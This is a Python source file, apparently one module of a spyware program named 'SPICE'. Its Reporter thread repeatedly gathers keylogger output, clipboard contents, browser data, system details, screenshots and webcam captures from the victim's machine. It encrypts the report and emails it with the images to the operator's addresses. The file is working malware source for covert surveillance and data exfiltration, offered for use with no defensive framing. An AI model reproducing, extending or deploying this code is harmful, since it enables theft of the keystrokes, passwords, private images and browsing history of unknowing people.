#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Zunayed Hassan'

import threading
import time
import os
import getpass
from Settings import *
from CommonTools import *
from AESCipher import *
from SendEmail import *


"""
CLASS NAME:     Reporter

PURPOSE:        1. To make a report of what spyware program observed
                2. Encrypt the report
                3. Email them as an attachment
"""
class Reporter(threading.Thread):
    _lastTime    = 0
    _currentTime = 0
    _report      = ""


    """
    METHOD NAME:    run
    PARAMETER:      None
    RETURN:         None

    ALGORITHM:      1. Open every report that spyware submitted from report folder
                    2. Encrypt them and save that as "report.dat" file
                    3. Attach with email that "report.dat" and other screenshot, webcam image taken from user and email
                       that to author.
                    4. Continue the whole process from step 1 to step 3
    """
    def run(self):
        self._lastTime = time.time()

        while RUN_REPORTER:
            self._currentTime = time.time()

            # Gathering report from report folder
            if (self._currentTime - self._lastTime) >= REPORTER_REPORT_TIME_INTERVAL:
                self._report = "<-[ SPICE " + VERSION + " (Spyware Agent) Report for \'" + getpass.getuser() + "\' at " + time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time())) + " ]->\n"

                if RUN_KEYLOGGER and os.path.exists(KEY_LOGGER_REPORT_FILE_NAME):
                    self._report += "[ KEY LOGGER ]" + GetFileContent(KEY_LOGGER_REPORT_FILE_NAME)

                if RUN_CLIPBOARD_COPIER and os.path.exists(CLIPBOARD_COPIER_FILE_NAME):
                    self._report += "\n\n[ CLIPBOARD COPIER ]" + GetFileContent(CLIPBOARD_COPIER_FILE_NAME) + "\n\n"

                if RUN_WEB_BROWSER_DIGGER and os.path.exists(WEB_BROWSER_DIGGER_FILE_NAME):
                    self._report += "\n\n[ WEB BROWSER DIGGER ]" + GetFileContent(WEB_BROWSER_DIGGER_FILE_NAME) + "\n\n"

                if RUN_SYSTEM_INFORMATION and os.path.exists(SYSTEM_INFORMATION_FILE_NAME):
                    self._report += "\n\n[ SYSTEM INFORMATION (for " + getpass.getuser() + ") ]\n" + GetFileContent(SYSTEM_INFORMATION_FILE_NAME) + "\n\n"

                # Encrypting those text report
                SaveContent(AGENT_LOCATION + "Report\\report.dat", (AESCipher(ENCRYPTION_PASSWORD)).Encrypt(self._report), FileMode["WRITE"])
                os.chdir(AGENT_LOCATION + "Report")

                # Attaching report file for emailing
                reportAttachments = [ "report.dat" ]
                allFilesAndFoldersInReport = os.listdir(AGENT_LOCATION + "Report")

                for reportFile in allFilesAndFoldersInReport:
                    if HasExtension(reportFile, ".png") or HasExtension(reportFile, ".jpg"):
                        reportAttachments.append(reportFile)

                # Now sending email
                sEmail = SendEmail()
                sEmail.SendFrom = AGENT_EMAIL_ADDRESS
                sEmail.Password = AGENT_EMAIL_PASSWORD
                sEmail.SendTo = AGENT_HQ_EMAIL_ADDRESSES
                sEmail.Subject = "Report of \'" + getpass.getuser() + "\' at " + time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time()))
                sEmail.Text = ""
                sEmail.Files = reportAttachments
                sEmail.Server = AGENT_EMAIL_SENDING_SERVER
                sEmail.start()

                self._lastTime = time.time()

            time.sleep(REPORTER_REPORT_TIME_INTERVAL)